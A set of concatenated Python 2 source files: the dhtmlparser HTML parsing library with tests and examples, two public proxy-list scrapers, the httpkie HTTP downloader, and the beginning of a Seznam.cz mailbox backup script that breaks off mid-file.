		elif isinstance(tag, str) and (isinstance(second, list) or \
			 isinstance(second, tuple)) and len(second) > 0 and    \
			 isinstance(second[0], HTMLElement):

			# containers with childs are automatically considered tags
			if tag.strip() != "":
				if not tag.startswith("<"):
					tag = "<" + tag
				if not tag.endswith(">"):
					tag += ">"

			self.__init_tag(tag)
			self.childs = closeElements(second)
			self.endtag = HTMLElement("</" + self.getTagName() + ">")
		elif (isinstance(tag, list) or isinstance(tag, tuple)) and len(tag) > 0 \
		     and isinstance(tag[0], HTMLElement):
			self.__init_tag("")
			self.childs = closeElements(tag)
		else:
			raise Exception("Oh no, not this crap!")


	#===========================================================================
	#= Constructor overloading =================================================
	#===========================================================================
	def __init_tag(self, tag):
			self.__element = tag

			self.__parseIsTag()
			self.__parseIsComment()

			if (not self.__istag) or self.__iscomment:
				self.__tagname = self.__element
			else:
				self.__parseTagName()

			if self.__iscomment or not self.__istag:
				return

			self.__parseIsEndTag()
			self.__parseIsNonPairTag()

			if self.__istag and (not self.__isendtag) or "=" in self.__element:
				self.__parseParams()


	# used when HTMLElement(tag, params) is called - basically create string
	# from tagname and params
	def __init_tag_params(self, tag, params):
		tag = tag.strip().replace(" ", "")
		nonpair = ""

		if tag.startswith("<"):
			tag = tag[1:]

		if tag.endswith("/>"):
			tag = tag[:-2]
			nonpair = " /"
		elif tag.endswith(">"):
			tag = tag[:-1]

		output = "<" + tag

		for key in params.keys():
			output += " " + key + '="' + escape(params[key], '"') + '"'

		self.__init_tag(output + nonpair + ">")


	def find(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Same as findAll, but without endtags. You can always get them from
		.endtag property..
		"""

		dom = self.findAll(tag_name, params, fn, case_sensitive)

		return filter(lambda x: not x.isEndTag(), dom)


	def findB(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Same as findAllB, but without endtags. You can always get them from
		.endtag property..
		"""

		dom = self.findAllB(tag_name, params, fn, case_sensitive)

		return filter(lambda x: not x.isEndTag(), dom)


	def findAll(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Simple search engine using Depth-first algorithm
		http://en.wikipedia.org/wiki/Depth-first_search.

		Finds elements and subelements which match patterns given by parameters.
		Allows searching defined by users lambda function.

		@param tag_name: Name of tag.
		@type tag_name: string

		@param params: Parameters of arg.
		@type params: dictionary

		@param fn: User defined function for search.
		@type fn: lambda function

		@param case_sensitive: Search case sensitive. Default True.
		@type case_sensitive: bool

		@return: Matches.
		@rtype: Array of HTMLElements
		"""
		output = []

		if self.isAlmostEqual(tag_name, params, fn, case_sensitive):
			output.append(self)

		tmp = []
		for el in self.childs:
			tmp = el.findAll(tag_name, params, fn, case_sensitive)

			if tmp is not None and len(tmp) > 0:
				output.extend(tmp)

		return output


	def findAllB(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Simple search engine using Breadth-first algorithm
		http://en.wikipedia.org/wiki/Breadth-first_search.

		Finds elements and subelements which match patterns given by parameters.
		Allows searching defined by users lambda function.

		@param tag_name: Name of tag.
		@type tag_name: string

		@param params: Parameters of arg.
		@type params: dictionary

		@param fn: User defined function for search.
		@type fn: lambda function

		@param case_sensitive: Search case sensitive. Default True.
		@type case_sensitive: bool

		@return: Matches.
		@rtype: Array of HTMLElements
		"""
		output = []

		if self.isAlmostEqual(tag_name, params, fn, case_sensitive):
			output.append(self)

		breadth_search = self.childs
		for el in breadth_search:
			if el.isAlmostEqual(tag_name, params, fn, case_sensitive):
				output.append(el)

			if len(el.childs) > 0:
				breadth_search.extend(el.childs)

		return output


	#==========================================================================
	#= Parsers ================================================================
	#==========================================================================
	def __parseIsTag(self):
		if self.__element.startswith("<") and self.__element.endswith(">"):
			self.__istag = True
		else:
			self.__istag = False


	def __parseIsEndTag(self):
		last = ""
		self.__isendtag = False

		if self.__element.startswith("<") and self.__element.endswith(">"):
			for c in self.__element:
				if c == "/" and last == "<":
					self.__isendtag = True
				if ord(c) > 32:
					last = c


	def __parseIsNonPairTag(self):
		last = ""
		self.__isnonpairtag = False

		# Tags endings with /> are nonpair - do not mind whitespaces (< 32)
		if self.__element.startswith("<") and self.__element.endswith(">"):
			for c in self.__element:
				if c == ">" and last == "/":
					self.__isnonpairtag = True
					return
				if ord(c) > 32:
					last = c

		# Check listed nonpair tags
		if self.__tagname.lower() in NONPAIR_TAGS:
			self.__isnonpairtag = True


	def __parseIsComment(self):
		if self.__element.startswith("<!--") and self.__element.endswith("-->"):
			self.__iscomment = True
		else:
			self.__iscomment = False


	def __parseTagName(self):
		for el in self.__element.split(" "):
			el = el.replace("/", "").replace("<", "").replace(">", "")
			if len(el) > 0:
				self.__tagname = el.rstrip()
				return


	def __parseParams(self):
		# check if there are any parameters
		if " " not in self.__element or "=" not in self.__element:
			return

		# Remove '<' & '>'
		params = self.__element.strip()[1:-1].strip()
		# Remove tagname
		params = params[
			params.find(self.getTagName()) + len(self.getTagName()):
		].strip()

		# Parser machine
		next_state = 0
		key = ""
		value = ""
		end_quote = ""
		buff = ["", ""]
		for c in params:
			if next_state == 0:  # key
				if c.strip() != "":  # safer than list space, tab and all possible whitespaces in UTF
					if c == "=":
						next_state = 1
					else:
						key += c
			elif next_state == 1:  # value decisioner
				if c.strip() != "":  # skip whitespaces
					if c == "'" or c == '"':
						next_state = 3
						end_quote = c
					else:
						next_state = 2
						value += c
			elif next_state == 2:  # one word parameter without quotes
				if c.strip() == "":
					next_state = 0
					self.params[key] = value
					key = ""
					value = ""
				else:
					value += c
			elif next_state == 3:  # quoted string
				if c == end_quote and (buff[0] != "\\" or (buff[0]) == "\\" and buff[1] == "\\"):
					next_state = 0
					self.params[key] = unescape(value, end_quote)
					key = ""
					value = ""
					end_quote = ""
				else:
					value += c

			buff = rotate_buff(buff)
			buff[0] = c

		if key != "":
			if end_quote != "" and value.strip() != "":
				self.params[key] = unescape(value, end_quote)
			else:
				self.params[key] = value

		if len(filter(lambda x: x == "/", self.params.keys())) > 0:
			del self.params["/"]
			self.__isnonpairtag = True

	#* /Parsers ****************************************************************


	#===========================================================================
	#= Getters =================================================================
	#===========================================================================
	def isTag(self):
		"True if element is tag (not content)."
		return self.__istag


	def isEndTag(self):
		"True if HTMLElement is end tag (/tag)."
		return self.__isendtag


	def isNonPairTag(self, isnonpair = None):
		"""
		Returns True if HTMLElement is listed nonpair tag table (br for example)
		or if it ends with / - <br /> for example.

		You can also change state from pair to nonpair if you use this as setter.
		"""
		if isnonpair is None:
			return self.__isnonpairtag
		else:
			self.__isnonpairtag = isnonpair
			if not isnonpair:
				self.endtag = None
				self.childs = []


	def isPairTag(self):
		"""
		Return True if this is paired tag - <body> .. </body> for example.
		"""
		if self.isComment() or self.isNonPairTag:
			return False
		if self.isEndTag():
			return True
		if self.isOpeningTag() and self.endtag is not None:
			return True

		return False


	def isComment(self):
		"True if HTMLElement is html comment."
		return self.__iscomment


	def isOpeningTag(self):
		"True if is opening tag."
		if self.isTag() and (not self.isComment()) and (not self.isEndTag()) \
		   and (not self.isNonPairTag()):
			return True
		else:
			return False


	def isEndTagTo(self, opener):
		"Returns true, if this element is endtag to opener."
		if self.__isendtag and opener.isOpeningTag():
			if self.__tagname.lower() == opener.getTagName().lower():
				return True
			else:
				return False
		else:
			return False


	def tagToString(self):
		"Returns tag (with parameters), without content or endtag."
		if len(self.params) <= 0:
			return self.__element
		else:
			output = "<" + str(self.__tagname)

			for key in self.params.keys():
				output += " " + key + "=\"" + escape(self.params[key], '"') + "\""

			return output + " />" if self.__isnonpairtag else output + ">"


	def getTagName(self):
		"Returns tag name."
		return self.__tagname


	def getContent(self):
		"Returns content of tag (everything between opener and endtag)."
		output = ""

		for c in self.childs:
			if not c.isEndTag():
				output += c.toString()

		if output.endswith("\n"):
			output = output[:-1]

		return output


	def prettify(self, depth = 0, separator = "  ", last = True, pre = False, inline = False):
		"Returns prettifyied tag with content."
		output = ""

		if self.getTagName() != "" and self.tagToString().strip() == "":
			return ""

		# if not inside <pre> and not inline, shift tag to the right
		if not pre and not inline:
			output += (depth * separator)

		# for <pre> set 'pre' flag
		if self.getTagName().lower() == "pre" and self.isOpeningTag():
			pre = True
			separator = ""

		output += self.tagToString()

		# detect if inline
		is_inline = inline  # is_inline shows if inline was set by detection, or as parameter
		for c in self.childs:
			if not (c.isTag() or c.isComment()):
				if len(c.tagToString().strip()) != 0:
					inline = True

		# don't shift if inside container (containers have blank tagname)
		original_depth = depth
		if self.getTagName() != "":
			if not pre and not inline:  # inside <pre> doesn't shift tags
				depth += 1
				if self.tagToString().strip() != "":
					output += "\n"

		# prettify childs
		for e in self.childs:
			if not e.isEndTag():
				output += e.prettify(depth, last = False, pre = pre, inline = inline)

		# endtag
		if self.endtag is not None:
			if not pre and not inline:
				output += ((original_depth) * separator)

			output += self.endtag.tagToString().strip()

			if not is_inline:
				output += "\n"

		return output

	#* /Getters ****************************************************************


	#===========================================================================
	#= Operators ===============================================================
	#===========================================================================
	def toString(self, original = False):
		"""
		Returns almost original string (use original = True if you want exact copy).

		If you want prettified string, try .prettify()

		If original == True, return parsed element, so if you changed something
		in .params, there will be no traces of those changes.
		"""
		output = ""

		if self.childs != [] or self.isOpeningTag():
			output += self.__element if original else self.tagToString()

			for c in self.childs:
				output += c.toString(original)

			if self.endtag is not None:
				output += self.endtag.tagToString()
		elif not self.isEndTag():
			output += self.tagToString()

		return output


	def __str__(self):
		return self.toString()


	def isAlmostEqual(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Compare element with given tagname, params and/or by lambda function.

		Lambda function is same as in .find().
		"""

		if isinstance(tag_name, HTMLElement):
			return self.isAlmostEqual(tag_name.getTagName(), self.params)

		# search by lambda function
		if fn is not None:
			if fn(self):
				return True

		if not case_sensitive:
			self.__tagname = self.__tagname.lower()
			tag_name = tag_name.lower()

		# compare tagname
		if self.__tagname == tag_name and self.__tagname != "" and self.__tagname is not None:
			# compare parameters
			if params is None or len(params) == 0:
				return True
			elif len(self.params) > 0:
				for key in params.keys():
					if key not in self.params:
						return False
					elif params[key] != self.params[key]:
						return False

				return True

		return False

	#* /Operators **************************************************************


	#===========================================================================
	#= Setters =================================================================
	#===========================================================================
	def replaceWith(self, el):
		"""
		Replace element. Useful when you don't want change all references to object.
		"""
		self.childs = el.childs
		self.params = el.params
		self.endtag = el.endtag
		self.openertag = el.openertag

		self.__tagname = el.getTagName()
		self.__element = el.tagToString()

		self.__istag = el.isTag()
		self.__isendtag = el.isEndTag()
		self.__iscomment = el.isComment()
		self.__isnonpairtag = el.isNonPairTag()


	def removeChild(self, child, end_tag_too = True):
		"""
		Remove subelement (child) specified by reference.

		This can't be used for removing subelements by value! If you want do
		such thing, do:

		---
		for e in dom.find("value"):
			dom.removeChild(e)
		---

		Params:
			child
				child which will be removed from dom (compared by reference)
			end_tag_too
				remove end tag too - default true
		"""

		if len(self.childs) <= 0:
			return

		end_tag = None
		if end_tag_too:
			end_tag = child.endtag

		for e in self.childs:
			if e == child:
				self.childs.remove(e)
			if end_tag_too and end_tag == e and end_tag is not None:
				self.childs.remove(e)
			else:
				e.removeChild(child, end_tag_too)

	#* /Setters ****************************************************************



def closeElements(childs):
	"Close tags - used in some constructors"

	o = []

	# Close all unclosed pair tags
	for e in childs:
		if e.isTag():
			if not e.isNonPairTag() and not e.isEndTag() and not e.isComment() and e.endtag is None:
				e.childs = closeElements(e.childs)

				o.append(e)
				o.append(HTMLElement("</" + e.getTagName() + ">"))

				# Join opener and endtag
				e.endtag = o[-1]
				o[-1].openertag = e
			else:
				o.append(e)
		else:
			o.append(e)

	return o



def __raw_split(itxt):
	"""
	Parse HTML from text into array filled with tags end text.

	Source code is little bit unintutive, because it is simple parser machine.
	For better understanding, look at;
	http://kitakitsune.org/images/field_parser.png
	"""
	echr = ""
	buff = ["", "", "", ""]
	content = ""
	array = []
	next_state = 0
	inside_tag = False

	for c in itxt:
		if next_state == 0:  # content
			if c == "<":
				if len(content) > 0:
					array.append(content)
				content = c
				next_state = 1
				inside_tag = False
			else:
				content += c
		elif next_state == 1:  # html tag
			if c == ">":
				array.append(content + c)
				content = ""
				next_state = 0
			elif c == "'" or c == '"':
				echr = c
				content += c
				next_state = 2
			elif c == "-" and buff[0] == "-" and buff[1] == "!" and buff[2] == "<":
				if len(content[:-3]) > 0:
					array.append(content[:-3])
				content = content[-3:] + c
				next_state = 3
			else:
				if c == "<":  # jump back into tag instead of content
					inside_tag = True
				content += c
		elif next_state == 2:  # "" / ''
			if c == echr and (buff[0] != "\\" or (buff[0] == "\\" and buff[1] == "\\")):
				next_state = 1
			content += c
		elif next_state == 3:  # html comments
			if c == ">" and buff[0] == "-" and buff[1] == "-":
				if inside_tag:
					next_state = 1
				else:
					next_state = 0
				inside_tag = False

				array.append(content + c)
				content = ""
			else:
				content += c

		# rotate buffer
		buff = rotate_buff(buff)
		buff[0] = c

	if len(content) > 0:
		array.append(content)

	return array



def __repair_tags(raw_input):
	"""
	Repair tags with comments (<HT<!-- asad -->ML> is parsed to
	["<HT", "<!-- asad -->", "ML>"]	and I need ["<HTML>", "<!-- asad -->"])
	"""
	ostack = []

	index = 0
	while index < len(raw_input):
		el = raw_input[index]

		if el.isComment():
			if index > 0 and index < len(raw_input) - 1:
				if raw_input[index - 1].tagToString().startswith("<") and raw_input[index + 1].tagToString().endswith(">"):
					ostack[-1] = HTMLElement(ostack[-1].tagToString() + raw_input[index + 1].tagToString())
					ostack.append(el)
					index += 1
					continue

		ostack.append(el)

		index += 1

	return ostack



def __indexOfEndTag(istack):
	"""
	Go through istack and search endtag. Element at first index is considered as
	opening tag.

	Returns: index of end tag or 0 if not found.
	"""
	if len(istack) <= 0:
		return 0

	if not istack[0].isOpeningTag():
		return 0

	opener = istack[0]
	cnt = 0

	index = 0
	for el in istack[1:]:
		if el.isOpeningTag() and (el.getTagName().lower() == opener.getTagName().lower()):
			cnt += 1
		elif el.isEndTagTo(opener):
			if cnt == 0:
				return index + 1
			else:
				cnt -= 1

		index += 1

	return 0



def __parseDOM(istack):
	"Recursively go through element array and create DOM."
	ostack = []
	end_tag_index = 0

	index = 0
	while index < len(istack):
		el = istack[index]

		end_tag_index = __indexOfEndTag(istack[index:])  # Check if this is pair tag

		if not el.isNonPairTag() and end_tag_index == 0 and not el.isEndTag():
			el.isNonPairTag(True)

		if end_tag_index != 0:
			el.childs = __parseDOM(istack[index + 1: end_tag_index + index])
			el.endtag = istack[end_tag_index + index]  # Reference to endtag
			el.endtag.openertag = el
			ostack.append(el)
			ostack.append(el.endtag)
			index = end_tag_index + index
		else:
			if not el.isEndTag():
				ostack.append(el)

		index += 1

	return ostack



def parseString(txt):
	"""
	Parse given string and return DOM tree consisting of single linked
	HTMLElements.
	"""
	istack = []

	# remove UTF BOM (prettify fails if not)
	if len(txt) > 3 and txt.startswith("\xef\xbb\xbf"):
		txt = txt[3:]

	for el in __raw_split(txt):
		istack.append(HTMLElement(el))

	container = HTMLElement()
	container.childs = __parseDOM(__repair_tags(istack))

	return container



def makeDoubleLinked(dom, parent = None):
	"""
	Standard output from dhtmlparser is single-linked tree. This will make it 
	double-linked.
	"""
	dom.parent = parent

	if len(dom.childs) > 0:
		for child in dom.childs:
			child.parent = dom
			makeDoubleLinked(child, dom)



#==============================================================================
#= Main program ===============================================================
#==============================================================================
if __name__ == "__main__":
	print "Testing.."

	assert unescape(r"""\' \\ \" \n""")      == r"""\' \\ " \n"""
	assert unescape(r"""\' \\ \" \n""", "'") == r"""' \\ \" \n"""
	assert unescape(r"""\' \\" \n""")        == r"""\' \\" \n"""
	assert unescape(r"""\' \\" \n""")        == r"""\' \\" \n"""
	assert unescape(r"""printf(\"hello \t world\");""") == r"""printf("hello \t world");"""

	assert escape(r"""printf("hello world");""") == r"""printf(\"hello world\");"""
	assert escape(r"""'""", "'") == r"""\'"""

	dom = parseString("""
		"<div Id='xe' a='b'>obsah xe divu</div> <!-- Id, not id :) -->
		 <div id='xu' a='b'>obsah xu divu</div>
	""")

	# find test
	divXe = dom.find("div", {"id":"xe"})[0]
	divXu = dom.find("div", {"id":"xu"})[0]

	# assert divXe.tagToString() == """<div a="b" id="xe">"""
	# assert divXu.tagToString() == """<div a="b" id="xu">"""

	# unit test for toString
	assert divXe.toString() == """<div a="b" Id="xe">obsah xe divu</div>"""
	assert divXu.toString() == """<div a="b" id="xu">obsah xu divu</div>"""

	# getTagName() test
	assert divXe.getTagName() == "div"
	assert divXu.getTagName() == "div"

	# isComment() test
	assert divXe.isComment() == False
	assert divXe.isComment() == divXu.isComment()

	assert divXe.isNonPairTag() != divXe.isOpeningTag()

	assert divXe.isTag() is True
	assert divXe.isTag() == divXu.isTag()

	assert divXe.getContent() == "obsah xe divu"

	# find()/findB() test
	dom = parseString("""
		<div id=first>
			First div.
			<div id=first.subdiv>
				Subdiv in first div.
			</div>
		</div>
		<div id=second>
			Second.
		</div>
	""")

	assert dom.find("div")[1].getContent().strip() == "Subdiv in first div."
	assert dom.findB("div")[1].getContent().strip() == "Second."

	print "Everything ok."
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
import dhtmlparser as d

s = """
<root>
	<object1>Content of first object</object1>
	<object2>Second objects content</object2>
</root>
"""

dom = d.parseString(s)

print dom
print "---\nRemove all <object1>:\n---\n"

# remove all <object1>
for e in dom.find("object1"):
	dom.removeChild(e)


print dom.prettify()


#* Prints: *********************************************************************
"""
<root>
	<object1>Content of first object</object1>
	<object2>Second objects content</object2>
</root>

---
Remove all <object1>:
---

<root>
  <object2>Second objects content</object2>
</root>
"""
#*******************************************************************************#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
from dhtmlparser import *

# if inside container (or other tag), create endtag automatically
print HTMLElement([
	HTMLElement("<xe>")
])
"""
Writes:

<xe>
</xe>
"""

#-------------------------------------------------------------------------------

# if not inside container, elements are left unclosed 
print HTMLElement("<xe>")
"""
Writes only:

<xe>
"""#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
DHTMLParserPy example how to find every link in document.
"""

import urllib
import dhtmlparser

f = urllib.urlopen("http://google.com")
data = f.read()
f.close()

dom = dhtmlparser.parseString(data)

for link in dom.find("a"):
	if "href" in link.params:
		print link.params["href"]#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
from dhtmlparser import *

foo = HTMLElement("<xe one='param'>")
baz = HTMLElement('<xe one="param">')

assert foo != baz # references are not the same
assert foo.isAlmostEqual(baz)#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# DHTMLParser DOM creation example.
from dhtmlparser import *

e = HTMLElement("root", [
		HTMLElement("item", {"param1":"1", "param2":"2"}, [
			HTMLElement("<crap>", [
				HTMLElement("hello parser!")
			]),
			HTMLElement("<another_crap/>", {"with" : "params"}),
			HTMLElement("<!-- comment -->")
		]),
		HTMLElement("<item />", {"blank" : "body"})
	])

print e.prettify()

"""
Writes:

<root>
  <item param2="2" param1="1">
    <crap>hello parser!</crap>
    <another_crap with="params" />
    <!-- comment -->
  </item>
  <item blank="body" />
</root>
"""
#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""
Proxy parser for http://www.ip-adress.com.

by Bystroushaak bystrousak@kitakitsune.org
"""
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import httpkie
import dhtmlparser



#= Functions & objects ========================================================
def getProxies():
	"""
	Return array of dicts following this structure:
	{
		ip: str(ip),
		port: int(port),
		type: str(Elite/Anonymous/etc..),
		country: str(country_name),
		ping: -1 # yeah, there is no ping information, this is just for compatibility
	}
	"""
	down = httpkie.Downloader()
	down.headers["Referer"] = "http://www.ip-adress.com/proxy_list/"

	dom = dhtmlparser.parseString(
		down.download("http://www.ip-adress.com/proxy_list/")
	)

	proxies = []
	for tr in dom.find("table", {"class": "proxylist"})[0].find("tr")[2:-1]:
		ip, port = tr.find("td")[0].getContent().split(":")
		proxy_type = tr.find("td")[1].getContent()

		country = tr.find("td")[2]
		country.find("img")[0].replaceWith(dhtmlparser.HTMLElement(""))
		country = country.getContent().strip()

		proxies.append({
			"ip": ip,
			"port": int(port),
			"type": proxy_type,
			"country": country,
			"ping": -1
		})

	return proxies



#= Main program ===============================================================
if __name__ == '__main__':
	import json
	print json.dumps(getProxies())
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Easy to use downloader library based on urllib/urllib2
by Bystroushaak (bystrousak@kitakitsune.org)

This work is licensed under a Creative Commons Licence
(http://creativecommons.org/licenses/by/3.0/cz/).
"""
# Imports =====================================================================
import urllib
import urllib2



# Variables ===================================================================
# IE 7/Windows XP headers.
IEHeaders = {
	"User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
	"Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
	"Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
	"Accept-Charset": "utf-8",
	"Keep-Alive": "300",
	"Connection": "keep-alive",
}
# Linux ubuntu x86_64 Firefox 23 headers
LFFHeaders = {
	"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:23.0) Gecko/20100101 Firefox/23.0",
	"Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
	"Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
	"Accept-Charset": "utf-8",
	"Keep-Alive": "300",
	"Connection": "keep-alive",
}



#= Functions & objects ========================================================
class Downloader():
	"""
	Lightweight class utilizing downloads from internet.

	Main method: .download()

	Important properties:
		.headers
		.response_headers
		.cookies
		.handle_cookies
	"""

	def __init__(self, headers = None, handle_cookies = True, http_proxy = None):
		"""
		You can set:

		headers -- default IEHeaders, but there is also LFFHeaders
		handle_cookies -- set to false if you don't wish to automatically handle cookies
		http_proxy -- 'url:port' describing HTTP proxy
		"""
		self.headers = headers if headers is not None else IEHeaders
		self.response_headers = None

		self.cookies = {}
		self.handle_cookies = True

		self.http_proxy = None
		if http_proxy is not None:
			self.http_proxy = {'http': http_proxy}


	def download(self, url, get = None, post = None, head = None):
		"""
		Parameters:
		url -- set url to download, automatically adds htt:// if not present
		get -- dict with GET parameters 
		post -- dict with POST parameters
		head -- set to True if you wish to use HEAD request. Returns headers from
		server.
		"""
		# POST params
		if post is not None:
			if type(post) != dict:
				raise TypeError("Unknown type of post paramters.")
			post = urllib.urlencode(post)

		# append GET params to url
		if get is not None:
			if type(get) != dict:
				raise TypeError("Unknown type of get paramters.")
			get = urllib.urlencode(get)
			if "?" in url:
				if url[-1] == "&":
					url += get
				else:
					url += "&" + get
			else:
				url += "?" + get

			get = None

		# check if protocol is specified in |url|
		if not "://" in url:
			url = "http://" + url

		if self.handle_cookies:
			self.__setCookies(url)

		# HEAD request support
		url_req = urllib2.Request(url, post, self.headers)
		if head is not None:
			url_req.get_method = lambda: "HEAD"

		# http proxy support
		opener = None
		if self.http_proxy is None:
			opener = urllib2.build_opener()
		else:
			opener = urllib2.build_opener(urllib2.ProxyHandler(self.http_proxy))

		# download page and save headers from server
		f = opener.open(url_req)
		data = f.read()
		self.response_headers = f.info().items()
		f.close()

		if self.handle_cookies:
			self.__readCookies(url)

		# i suppose I could fix __readCookies() to use dict, but .. meh
		self.response_headers = dict(self.response_headers)

		# head doesn't have content, so return just response headers
		if head is not None:
			return self.response_headers

		return data


	def __setCookies(self, url):
		# add cokies into headers
		domain = self.__getDomain(url)
		if domain in self.cookies.keys():
			cookie_string = ""
			for key in self.cookies[domain].keys():
				cookie_string += key + "=" + str(self.cookies[domain][key]) + "; "

			self.headers["Cookie"] = cookie_string.strip()


	def __readCookies(self, url):
		# simple (and lame) cookie handling
		# parse "set-cookie" string
		cookie_string = ""
		for c in self.response_headers:
			if c[0].lower() == "set-cookie":
				cookie_string = c[1]

		# parse keyword:values
		tmp_cookies = {}
		for c in cookie_string.split(","):
			cookie = c
			if ";" in c:
				cookie = c.split(";")[0]
			cookie = cookie.strip()

			cookie = cookie.split("=")
			keyword = cookie[0]
			value = "=".join(cookie[1:])

			tmp_cookies[keyword] = value

		# append global variable cookis with new cookies
		if len(tmp_cookies) > 0:
			domain = self.__getDomain(url)

			if domain in self.cookies.keys():
				for key in tmp_cookies.keys():
					self.cookies[domain][key] = tmp_cookies[key]
			else:
				self.cookies[domain] = tmp_cookies

		# check for blank cookies
		if len(self.cookies) > 0:
			for domain in self.cookies.keys():
				for key in self.cookies[domain].keys():
					if self.cookies[domain][key].strip() == "":
						del self.cookies[domain][key]

				if len(self.cookies[domain]) == 0:
					del self.cookies[domain]


	def __getDomain(self, url):
		"""
		Parse domain from url.
		"""
		if "://" in url:
			url = url.split("://")[1]

		if "/" in url:
			url = url.split("/")[0]

		return url
# -*- coding: utf-8 -*-
# This file is there mainly for 'git submodule' use in other projects.

from httpkie import *#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""
Proxy parser for http://hidemyass.com/proxy-list/.

by Bystroushaak bystrousak@kitakitsune.org
"""
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import httpkie
import dhtmlparser as d



#= Variables ==================================================================
_POST_DATA = {
    "ac": "on",
    "c[]": "Netherlands",
    "p": "",
    "pr[]": "0",
    "a[]": "4",
    "pl": "on",
    "sp[]": "3",
    "ct[]": "3",
    "s": "0",
    "o": "0",
    "pp": "1",
    "sortBy": "date",
}



#= Functions & objects ========================================================
def __cleanThatShit(shit):
    visible = []

    # find all styles and parse visible class atributes
    for el in shit.find("", fn = lambda x: x.isTag()):
        styles = el.find("style")
        if len(styles) >= 1:
            style_string = ""
            for style in styles:
                style_string += style.getContent() + "\n"
                style.replaceWith(d.parseString(""))
            styles = map(lambda x: x.strip(), style_string.splitlines())
            styles = filter(lambda x: len(x) > 0 and "none" not in x, styles)
            visible += map(lambda x: x[1:].split("{")[0], styles)

    # remove invisible elements
    for el in shit.find("", fn = lambda x: x.isTag()):
        # remove display:none elements
        if "style" in el.params and "none" in el.params["style"]:
            el.replaceWith(d.parseString(""))

        # remove elements with invisible styles
        if "class" in el.params:
            if not el.params["class"].isdigit() and el.params["class"] not in visible:
                el.replaceWith(d.parseString(""))

    return shit


def __shitToIP(shit):
    shit = str(shit)

    content = ""
    for crap in shit.split(">"):
        crap = crap.split("<")[0]

        if crap == ".":
            content += "."
            continue

        if crap.isdigit() or crap.replace(".", "").isdigit():
            content += crap

    return content



def __getProxies(pp):
    down = httpkie.Downloader()

    _POST_DATA["pp"] = pp

    dom = d.parseString(
        down.download(
            "http://hidemyass.com/proxy-list/search-231187",
            post = _POST_DATA
        )
    )


    proxies = []
    for tr in dom.find("table")[0].find("tr")[1:]:
        country = tr.find("td")[3].find("span")[0].getContent()
        country = country.split("/>")[-1].strip()

        proxy = {
            "ip": __shitToIP(__cleanThatShit(tr.find("td")[1])),
            "port": tr.find("td")[2].getContent().strip(),
            "ping": int(tr.find("td")[5].find("div")[0].params["rel"]),
            "country": country
        }

        proxies.append(proxy)

    return proxies


def getProxies():
    """
    Return array of dicts following this structure:
    {
        ip: str(ip),
        port: int(port),
        country: str(country_name),
        ping: int(something numeric, but probably not exactly milliseconds)
    }
    """
    return __getProxies(1) + __getProxies(3)


#= Main program ===============================================================
if __name__ == '__main__':
    import json
    print json.dumps(getProxies())
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# MailAccountBackupper v1.1.0 (17.12.2011) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/cz/).
# Created in Geany text editor.
#
# Notes:
    # 
#= Imports =====================================================================
import sys
import time
import getpass
import sqlite3
import argparse
from sqlite3 import dbapi2 as sqlite

# 3rd party module
import socks

# own
from seznamcz import *
import IPtools



#= Main program ================================================================
# parse arguments
parser = argparse.ArgumentParser(description = "Seznam.cz email account mirrorer. This program downloads everything in user mailbox and save it as sqlite3 database.")

# required arguments
parser.add_argument("-p", "--proxy", metavar="hostname:port", action="store", type=str, help="SOCKS5 proxy adress. ")

# optional arguments
parser.add_argument("-d", "--directory", action="store", type=str, help="Backup only messages in given directory.")
parser.add_argument("-s", "--start", action="store", type=int, help="Start from message.")
parser.add_argument("-n", "--no-proxy", action="store_true", default=False, help="Do not use proxy..")
parser.add_argument("-l", "--password", action="store", type=str, help="Password parameter. If set, program doesn't ask for password.")

# positional
parser.add_argument("email", help="User's email address.")
args = parser.parse_args()

# validation of email address
if "@" not in args.email or not args.email.endswith(".cz"):
	sys.stderr.write("'" + args.email + "' isn't valid mailbox provided by http://seznam.cz!\n")
	sys.exit(1)


# get pasword
password = args.password
if password == None:
	password = getpass.getpass("Password: ")


# install proxy
if args.proxy != None:
	if ":" not in args.proxy:
		sys.stderr.write("You have to specify port in proxy settings!\n")
		sys.exit()
	
	p_tmp = args.proxy.split(":")
	port = 0
	hostname = ""
	try:
		hostname = p_tmp[0]
		port = int(p_tmp[1])
	except Exception, e:
		sys.stderr.write(str(e) + "\n")
		sys.exit(1)
	
	IPtools.installProxy(hostname, port)
elif args.no_proxy != True:
	sys.stderr.write("You have to use a proxy!\n")
	sys.exit(1)

# connect database
db = sqlite.connect(args.email.split("@")[0] + "_" + time.strftime("%d.%m.%y", time.gmtime()) + ".sqlite")
db.text_factory = sqlite3.OptimizedUnicode
db.text_factory = str

# try create tables (success only if not created from previous session)
try:
	db.executescript(
		"""
		CREATE TABLE Mails(
			mail_id INTEGER PRIMARY KEY AUTOINCREMENT,
			url VARCHAR(500) UNIQUE,
			from_address VARCHAR(100), 
			subject VARCHAR(1000), 
			date VARCHAR(50), 
			body TEXT, 
			headers TEXT
		);
